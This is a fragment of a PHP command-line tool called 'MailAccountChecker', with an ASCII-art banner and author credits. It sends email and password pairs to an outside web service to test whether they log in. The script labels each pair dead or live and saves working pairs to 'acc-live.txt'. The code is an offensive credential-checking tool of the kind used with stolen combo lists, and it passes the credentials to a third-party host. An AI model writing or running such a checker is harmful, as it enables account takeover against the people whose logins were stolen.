...
Console::log(" __  __       _ _                                   _    _____ _               _             
|  \/  |     (_) |   /\                            | |  / ____| |             | |            
| \  / | __ _ _| |  /  \   ___ ___ ___  _   _ _ __ | |_| |    | |__   ___  ___| | _____ _ __ 
| |\/| |/ _` | | | / /\ \ / __/ __/ _ \| | | | '_ \| __| |    | '_ \ / _ \/ __| |/ / _ \ '__|
| |  | | (_| | | |/ ____ \ (_| (_| (_) | |_| | | | | |_| |____| | | |  __/ (__|   <  __/ |   
|_|  |_|\__,_|_|_/_/    \_\___\___\___/ \__,_|_| |_|\__|\_____|_| |_|\___|\___|_|\_\___|_|   ", 'red');
console::log("By Apri Amsyah x Dito Firmansyah", 'green');
echo "\n";
...
$gas = curl('http://ceker12.beget.tech/EAC/check.php?do=check&mailpass='.$mail.'|'.$passwd.'&delim=|', null, $headers);
	if (strpos($gas[1], 'DIE')) {
		console::log("[Gagal] | $mail|$passwd", 'red');
	} if (strpos($gas[1], 'LIVE')) {
		console::log("[Success Login] | $mail|$passwd", 'green');
		fwrite(fopen("acc-live.txt", "a"), "[Success Login] | $mail|$passwd \n");		
		}
}
/**
 * PHP Colored CLI
